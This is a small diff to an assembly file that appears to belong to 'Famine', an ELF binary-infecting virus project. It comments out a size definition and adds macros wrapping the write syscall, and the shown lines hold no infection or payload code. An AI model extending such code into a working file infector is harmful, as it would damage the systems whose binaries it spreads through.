@@ -12,7 +12,7 @@
 
 
 %define FAMINE_SIZE _v_stop - _famine
-%define FAMINE_SIZE _end - _famine
+; %define FAMINE_SIZE _end - _famine
 
 ; ELF_HDR_DEFINITION
 %define ET_EXEC 0x02
@@ -76,6 +76,22 @@
         mov byte [rdi], byte 0
         cmp %2, 0
         jge .memset
+%endmacro
+
+%macro write 3
+    mov rdi, %1
+    mov rsi, %2
+    mov rdx, %3
+    mov rax, SYS_WRITE
+    syscall
+%endmacro
+
+%macro write_rel 3
+    mov rdi, %1
+    lea rsi, %2
+    mov rdx, %3
+    mov rax, SYS_WRITE
+    syscall
 %endmacro
 
 struc LDIRENT_64
